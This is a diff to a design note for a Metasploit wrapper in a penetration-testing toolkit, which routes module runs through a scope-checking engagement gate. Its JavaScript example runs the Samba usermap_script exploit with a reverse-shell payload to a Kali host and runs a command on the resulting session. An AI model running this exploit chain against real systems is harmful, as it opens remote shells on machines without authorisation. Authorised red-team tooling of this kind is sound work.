@@ -4,10 +4,12 @@
 module run and session command stays on the [engagement gate](RedTeamEngagementGate.md) — the principled
 alternative to Metasploit resource (`.rc`) scripts.*
 
-> **Status:** design draft. Nothing here is built yet. The current
-> [`MetasploitToolkit`](../src/Camel.PenTest.Toolkits/Metasploit/MetasploitToolkit.cs) ships a single
-> structured `RunModuleAsync`; this doc designs the richer fluent surface on top of the **same** gate
-> logic and the **same** `MsfRpcClient` transport.
+> **Status:** v1 implemented (redserver, uncommitted). The fluent surface
+> ([`MetasploitFluent.cs`](../src/Camel.PenTest.Toolkits/Metasploit/MetasploitFluent.cs):
+> `MsfModuleContext` + `MsfSessionHandle`; `UseAsync`/`GetSessionAsync`/`RunDatastoreAsync` on
+> [`MetasploitToolkit`](../src/Camel.PenTest.Toolkits/Metasploit/MetasploitToolkit.cs)) is built on the
+> **same** gate logic and `MsfRpcClient` transport as the one-shot `RunModuleAsync`. The datastore-as-properties
+> sugar (v2) and pivoting (v3) below remain unbuilt.
 
 > **Local-only during the hackathon freeze.** Like the rest of the red server, this lives on the
 > `redserver` branch and stays off GitHub until the Find Evil! hackathon is over.
@@ -50,20 +52,20 @@ those methods (module paths, datastore keys) are dynamic — and those are valid
 
 ```
 MetasploitToolkit                       (existing global; SearchModules / ModuleInfo / RunModule / ListSessions stay)
-  └─ Use(module)        ───────────────▶ MsfModuleContext     (a stateful, INERT datastore builder)
-         ├─ Set(key, value)  ─▶ this    (chainable; accumulates the datastore — NO daemon, NO gate yet)
-         ├─ SetMany({...})   ─▶ this
-         ├─ Get(key) / Options / Datastore
-         └─ RunAsync()       ─▶ ToolResult<ModuleRunResult>   ◀── THE GATE FIRES HERE
-                                          └─ .Session ─────────▶ MsfSessionHandle
-                                                                   ├─ RunCommandAsync(cmd) ─▶ ToolResult<string>  (re-checks peer scope)
-                                                                   ├─ Info / Type / PeerHost
-                                                                   └─ (future) pivot helpers
+  ├─ UseAsync(module)   ───────────────▶ ToolResult<MsfModuleContext>   (a stateful, INERT datastore builder)
+  │      ├─ Set(key, value)  ─▶ this    (chainable; accumulates the datastore — NO daemon, NO gate yet)
+  │      ├─ SetMany({...})   ─▶ this
+  │      ├─ Get(key) / Keys / Options / Module / Type
+  │      └─ RunAsync()       ─▶ ToolResult<ModuleRunResult>   ◀── THE GATE FIRES HERE  (.Result.SessionId)
+  └─ GetSessionAsync(id) ──────────────▶ ToolResult<MsfSessionHandle>
+                                            ├─ RunCommandAsync(cmd) ─▶ ToolResult<string>  (re-checks peer scope)
+                                            ├─ Info / Type / PeerHost / Id / ViaExploit
+                                            └─ (future) pivot helpers
 ```
 
-- **`MsfModuleContext`** is the msfconsole *module context* in object form. `Use("exploit/multi/samba/usermap_script")`
-  validates the module exists via the existing `module.info` RPC (returns a failed `ToolResult`/throws on an
-  unknown module), captures its type and option metadata, and starts an empty datastore. Every `Set` is a pure
+- **`MsfModuleContext`** is the msfconsole *module context* in object form. `UseAsync("exploit/multi/samba/usermap_script")`
+  validates the module exists via the existing `module.info` RPC (a failed `ToolResult` on an unknown module),
+  captures its type and option metadata (`.Options`), and starts an empty datastore. Every `Set` is a pure
   client-side dictionary write — **it touches no daemon and trips no gate** — so building up a run is free and
   reorderable.
 - **`RunAsync()`** is the single chokepoint (see next section). It materializes the accumulated datastore into one
@@ -122,12 +124,15 @@ The fix is to keep the *dynamic* parts as **data, not member names**:
 
 ```js
 // ADOPTED — closed method set (Use/Set/RunAsync); module path & option keys are validated strings
-const msf = MetasploitToolkit;                                  // optional alias
-const m = msf.Use("exploit/multi/samba/usermap_script");       // validated via module.info
+const u = await MetasploitToolkit.UseAsync("exploit/multi/samba/usermap_script");  // validated via module.info
+if (!u.IsSuccess) { error(u.Message); }
+const m = u.Result;                                            // m.Options lists the datastore options
 m.Set("RHOSTS", target).Set("PAYLOAD", "cmd/unix/reverse").Set("LHOST", kali);
-const run = await m.RunAsync();                                 // <-- gate fires
-const sess = run.Result.Session;
-const who = await sess.RunCommandAsync("id");
+const run = await m.RunAsync();                                // <-- gate fires
+if (run.IsSuccess && run.Result.OpenedSession) {
+  const s = await MetasploitToolkit.GetSessionAsync(run.Result.SessionId);
+  log((await s.Result.RunCommandAsync("id")).Result);
+}
 ```
 
 Module paths and option keys are *legitimately* open-ended — and they are checked against ground truth
